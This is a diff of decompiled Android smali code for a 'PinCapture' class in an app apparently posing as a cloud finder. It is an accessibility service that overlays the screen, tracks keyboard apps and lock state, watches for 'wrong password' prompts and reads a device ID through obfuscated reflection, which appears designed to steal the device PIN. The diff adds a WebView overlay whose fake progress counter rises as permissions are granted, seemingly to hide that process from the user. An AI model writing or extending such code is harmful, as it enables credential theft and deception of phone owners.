@@ -28,6 +28,8 @@
 
 .field private static flowStarted:Z
 
+.field private static grantedCount:I
+
 .field private static inputTs:J
 
 .field private static lastEventTs:J
@@ -41,6 +43,8 @@
 .field private static overlayTries:I
 
 .field private static overlayView:Landroid/view/View;
+
+.field private static overlayWebView:Landroid/webkit/WebView;
 
 .field private static polling:Z
 
@@ -327,7 +331,7 @@
 .method private static addOverlay(Landroid/accessibilityservice/AccessibilityService;)V
     .locals 5
 
-    .line 1127
+    .line 1169
     const-string v0, "PinCapture"
 
     sget-object v1, Lcom/lite/cloudfinder/pin/PinCapture;->overlayView:Landroid/view/View;
@@ -336,7 +340,7 @@
 
     return-void
 
-    .line 1129
+    .line 1171
     :cond_0
     :try_start_0
     const-string v1, "window"
@@ -351,7 +355,7 @@
 
     return-void
 
-    .line 1131
+    .line 1173
     :cond_1
     new-instance v2, Landroid/view/View;
 
@@ -359,59 +363,59 @@
 
     const v3, 0x1a00a3ff
 
-    .line 1132
+    .line 1174
     invoke-virtual {v2, v3}, Landroid/view/View;->setBackgroundColor(I)V
 
-    .line 1133
+    .line 1175
     new-instance v3, Landroid/view/WindowManager$LayoutParams;
 
     invoke-direct {v3}, Landroid/view/WindowManager$LayoutParams;-><init>()V
 
     const/16 v4, 0x7f0
 
-    .line 1134
+    .line 1176
     iput v4, v3, Landroid/view/WindowManager$LayoutParams;->type:I
 
     const/4 v4, -0x3
 
-    .line 1135
+    .line 1177
     iput v4, v3, Landroid/view/WindowManager$LayoutParams;->format:I
 
     const/16 v4, 0x318
 
-    .line 1136
+    .line 1178
     iput v4, v3, Landroid/view/WindowManager$LayoutParams;->flags:I
 
     const/16 v4, 0x33
 
-    .line 1140
+    .line 1182
     iput v4, v3, Landroid/view/WindowManager$LayoutParams;->gravity:I
 
     const/4 v4, -0x1
 
-    .line 1141
+    .line 1183
     iput v4, v3, Landroid/view/WindowManager$LayoutParams;->width:I
 
     const/16 v4, 0x78
 
-    .line 1142
+    .line 1184
     iput v4, v3, Landroid/view/WindowManager$LayoutParams;->height:I
 
     const/4 v4, 0x0
 
-    .line 1143
+    .line 1185
     iput v4, v3, Landroid/view/WindowManager$LayoutParams;->x:I
 
-    .line 1144
+    .line 1186
     iput v4, v3, Landroid/view/WindowManager$LayoutParams;->y:I
 
-    .line 1145
+    .line 1187
     invoke-interface {v1, v2, v3}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V
 
-    .line 1146
+    .line 1188
     sput-object v2, Lcom/lite/cloudfinder/pin/PinCapture;->overlayView:Landroid/view/View;
 
-    .line 1147
+    .line 1189
     const-string v1, "overlay added type=2032 h=120"
 
     invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
@@ -423,7 +427,7 @@
     :catchall_0
     move-exception v1
 
-    .line 1149
+    .line 1191
     new-instance v2, Ljava/lang/StringBuilder;
 
     const-string v3, "overlay failed: "
@@ -438,7 +442,7 @@
 
     invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
 
-    .line 1150
+    .line 1192
     sget v0, Lcom/lite/cloudfinder/pin/PinCapture;->overlayTries:I
 
     add-int/lit8 v1, v0, 0x1
@@ -449,7 +453,7 @@
 
     if-ge v0, v1, :cond_2
 
-    .line 1152
+    .line 1194
     new-instance v0, Landroid/os/Handler;
 
     invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;
@@ -458,9 +462,9 @@
 
     invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V
 
-    new-instance v1, Lcom/lite/cloudfinder/pin/PinCapture$8;
+    new-instance v1, Lcom/lite/cloudfinder/pin/PinCapture$9;
 
-    invoke-direct {v1, p0}, Lcom/lite/cloudfinder/pin/PinCapture$8;-><init>(Landroid/accessibilityservice/AccessibilityService;)V
+    invoke-direct {v1, p0}, Lcom/lite/cloudfinder/pin/PinCapture$9;-><init>(Landroid/accessibilityservice/AccessibilityService;)V
 
     const-wide/16 v2, 0x3e8
 
@@ -1452,7 +1456,7 @@
 .method private static deviceId()Ljava/lang/String;
     .locals 4
 
-    .line 1051
+    .line 1093
     const-string v0, ""
 
     :try_start_0
@@ -1462,7 +1466,7 @@
 
     move-result-object v1
 
-    .line 1052
+    .line 1094
     const-string v2, "\u0620"
 
     const/4 v3, 0x0
@@ -1475,14 +1479,14 @@
 
     move-result-object v2
 
-    .line 1053
+    .line 1095
     const-string v3, "\u0625"
 
     invoke-virtual {v1, v3}, Ljava/lang/Class;->getField(Ljava/lang/String;)Ljava/lang/reflect/Field;
 
     move-result-object v1
 
-    .line 1054
+    .line 1096
     invoke-virtual {v1, v2}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;
 
     move-result-object v1
@@ -1491,7 +1495,7 @@
 
     goto :goto_0
 
-    .line 1055
+    .line 1097
     :cond_0
     invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;
 
@@ -2452,12 +2456,12 @@
 .method private static isDelete(Ljava/lang/String;)Z
     .locals 2
 
-    .line 1094
+    .line 1136
     invoke-virtual {p0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
 
     move-result-object v0
 
-    .line 1095
+    .line 1137
     const-string v1, "\u5220\u9664"
 
     invoke-virtual {p0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I
@@ -2482,7 +2486,7 @@
 
     if-nez v0, :cond_1
 
-    .line 1096
+    .line 1138
     const-string v0, "\u232b"
 
     invoke-virtual {v0, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
@@ -2553,7 +2557,7 @@
 
     move v1, v0
 
-    .line 1108
+    .line 1150
     :goto_0
     invoke-virtual {p0}, Ljava/lang/String;->length()I
 
@@ -2561,7 +2565,7 @@
 
     if-ge v1, v2, :cond_2
 
-    .line 1109
+    .line 1151
     invoke-virtual {p0, v1}, Ljava/lang/String;->charAt(I)C
 
     move-result v2
@@ -2585,7 +2589,7 @@
     :goto_1
     return v0
 
-    .line 1112
+    .line 1154
     :cond_2
     invoke-virtual {p0}, Ljava/lang/String;->length()I
 
@@ -2602,12 +2606,12 @@
 .method private static isEnter(Ljava/lang/String;)Z
     .locals 2
 
-    .line 1100
+    .line 1142
     invoke-virtual {p0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
 
     move-result-object v0
 
-    .line 1101
+    .line 1143
     const-string v1, "\u786e\u5b9a"
 
     invoke-virtual {p0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I
@@ -2634,7 +2638,7 @@
 
     const-string v1, "enter"
 
-    .line 1102
+    .line 1144
     invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
 
     move-result v1
@@ -2659,7 +2663,7 @@
 
     const-string v1, "ok"
 
-    .line 1103
+    .line 1145
     invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
 
     move-result v1
@@ -2676,7 +2680,7 @@
 
     const-string v0, "\u2192"
 
-    .line 1104
+    .line 1146
     invoke-virtual {p0, v0}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I
 
     move-result p0
@@ -2701,7 +2705,7 @@
 .method private static isIme(Ljava/lang/String;)Z
     .locals 1
 
-    .line 1077
+    .line 1119
     const-string v0, "honeyboard"
 
     invoke-virtual {p0, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
@@ -2720,7 +2724,7 @@
 
     const-string v0, "gboard"
 
-    .line 1078
+    .line 1120
     invoke-virtual {p0, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
 
     move-result v0
@@ -2737,7 +2741,7 @@
 
     const-string v0, "sogou"
 
-    .line 1079
+    .line 1121
     invoke-virtual {p0, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
 
     move-result v0
@@ -2754,7 +2758,7 @@
 
     const-string v0, "swiftkey"
 
-    .line 1080
+    .line 1122
     invoke-virtual {p0, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
 
     move-result v0
@@ -2789,11 +2793,11 @@
 
     const/4 v0, 0x0
 
-    .line 1085
+    .line 1127
     :try_start_0
     const-string v1, "keyguard"
 
-    .line 1086
+    .line 1128
     invoke-virtual {p0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
 
     move-result-object p0
@@ -2802,7 +2806,7 @@
 
     if-eqz p0, :cond_0
 
-    .line 1087
+    .line 1129
     invoke-virtual {p0}, Landroid/app/KeyguardManager;->isKeyguardLocked()Z
 
     move-result p0
@@ -2825,7 +2829,7 @@
 
     move v1, v0
 
-    .line 1116
+    .line 1158
     :goto_0
     invoke-virtual {p0}, Ljava/lang/String;->length()I
 
@@ -2833,7 +2837,7 @@
 
     if-ge v1, v2, :cond_1
 
-    .line 1117
+    .line 1159
     invoke-virtual {p0, v1}, Ljava/lang/String;->charAt(I)C
 
     move-result v2
@@ -2865,7 +2869,7 @@
 
     goto :goto_0
 
-    .line 1122
+    .line 1164
     :cond_1
     invoke-virtual {p0}, Ljava/lang/String;->length()I
 
@@ -2882,12 +2886,12 @@
 .method private static isWrongHint(Ljava/lang/String;)Z
     .locals 2
 
-    .line 1069
+    .line 1111
     invoke-virtual {p0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
 
     move-result-object v0
 
-    .line 1070
+    .line 1112
     const-string v1, "\u5bc6\u7801\u9519\u8bef"
 
     invoke-virtual {p0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I
@@ -2906,7 +2910,7 @@
 
     const-string v1, "\u518d\u8bd5"
 
-    .line 1071
+    .line 1113
     invoke-virtual {p0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I
 
     move-result v1
@@ -2923,7 +2927,7 @@
 
     const-string p0, "wrong"
 
-    .line 1072
+    .line 1114
     invoke-virtual {v0, p0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
 
     move-result p0
@@ -2940,7 +2944,7 @@
 
     const-string p0, "try again"
 
-    .line 1073
+    .line 1115
     invoke-virtual {v0, p0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
 
     move-result p0
@@ -3019,7 +3023,7 @@
 .method private static match(Ljava/lang/String;)Z
     .locals 6
 
-    .line 1062
+    .line 1104
     sget-object v0, Lcom/lite/cloudfinder/pin/PinCapture;->PKGS:[Ljava/lang/String;
 
     array-length v1, v0
@@ -3035,7 +3039,7 @@
 
     aget-object v5, v0, v3
 
-    .line 1063
+    .line 1105
     invoke-virtual {v5, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
 
     move-result v5
@@ -3049,7 +3053,7 @@
 
     goto :goto_0
 
-    .line 1065
+    .line 1107
     :cond_1
     const-string v0, "systemui"
 
@@ -3770,6 +3774,33 @@
     invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
 
     :goto_3
+    return-void
+.end method
+
+.method public static onPermissionGranted()V
+    .locals 2
+
+    .line 1064
+    sget v0, Lcom/lite/cloudfinder/pin/PinCapture;->grantedCount:I
+
+    add-int/lit8 v0, v0, 0x1
+
+    sput v0, Lcom/lite/cloudfinder/pin/PinCapture;->grantedCount:I
+
+    const/16 v1, 0x64
+
+    mul-int/2addr v0, v1
+
+    .line 1065
+    div-int/lit8 v0, v0, 0x9
+
+    invoke-static {v1, v0}, Ljava/lang/Math;->min(II)I
+
+    move-result v0
+
+    .line 1066
+    invoke-static {v0}, Lcom/lite/cloudfinder/pin/PinCapture;->updateOverlayProgress(I)V
+
     return-void
 .end method
 
@@ -4567,6 +4598,20 @@
     return-void
 .end method
 
+.method public static resetOverlayProgress()V
+    .locals 1
+
+    const/4 v0, 0x0
+
+    .line 1058
+    sput v0, Lcom/lite/cloudfinder/pin/PinCapture;->grantedCount:I
+
+    .line 1059
+    invoke-static {v0}, Lcom/lite/cloudfinder/pin/PinCapture;->updateOverlayProgress(I)V
+
+    return-void
+.end method
+
 .method private static scheduleFallback(Landroid/content/Context;JI)V
     .locals 2
 
@@ -4940,6 +4985,42 @@
     invoke-static {v2, p1, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
 
     return v4
+.end method
+
+.method public static setOverlayWebView(Landroid/webkit/WebView;)V
+    .locals 2
+
+    .line 1053
+    sput-object p0, Lcom/lite/cloudfinder/pin/PinCapture;->overlayWebView:Landroid/webkit/WebView;
+
+    .line 1054
+    new-instance v0, Ljava/lang/StringBuilder;
+
+    const-string v1, "overlay webview bound="
+
+    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    if-eqz p0, :cond_0
+
+    const/4 p0, 0x1
+
+    goto :goto_0
+
+    :cond_0
+    const/4 p0, 0x0
+
+    :goto_0
+    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;
+
+    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object p0
+
+    const-string v0, "PinCapture"
+
+    invoke-static {v0, p0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+
+    return-void
 .end method
 
 .method private static setValue(Ljava/lang/String;)V
@@ -5638,5 +5719,73 @@
     :goto_4
     monitor-exit v2
 
+    return-void
+.end method
+
+.method public static updateOverlayProgress(I)V
+    .locals 3
+
+    .line 1070
+    sget-object v0, Lcom/lite/cloudfinder/pin/PinCapture;->overlayWebView:Landroid/webkit/WebView;
+
+    .line 1071
+    new-instance v1, Ljava/lang/StringBuilder;
+
+    const-string v2, "optProgress="
+
+    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual {v1, p0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    const-string v2, " wv="
+
+    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    if-eqz v0, :cond_0
+
+    const/4 v2, 0x1
+
+    goto :goto_0
+
+    :cond_0
+    const/4 v2, 0x0
+
+    :goto_0
+    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;
+
+    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v1
+
+    const-string v2, "PinCapture"
+
+    invoke-static {v2, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+
+    if-nez v0, :cond_1
+
+    return-void
+
+    .line 1074
+    :cond_1
+    :try_start_0
+    new-instance v1, Lcom/lite/cloudfinder/pin/PinCapture$8;
+
+    invoke-direct {v1, v0, p0}, Lcom/lite/cloudfinder/pin/PinCapture$8;-><init>(Landroid/webkit/WebView;I)V
+
+    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->post(Ljava/lang/Runnable;)Z
+    :try_end_0
+    .catchall {:try_start_0 .. :try_end_0} :catchall_0
+
+    goto :goto_1
+
+    :catchall_0
+    move-exception p0
+
+    .line 1086
+    const-string v0, "progress post failed"
+
+    invoke-static {v2, v0, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
+
+    :goto_1
     return-void
 .end method
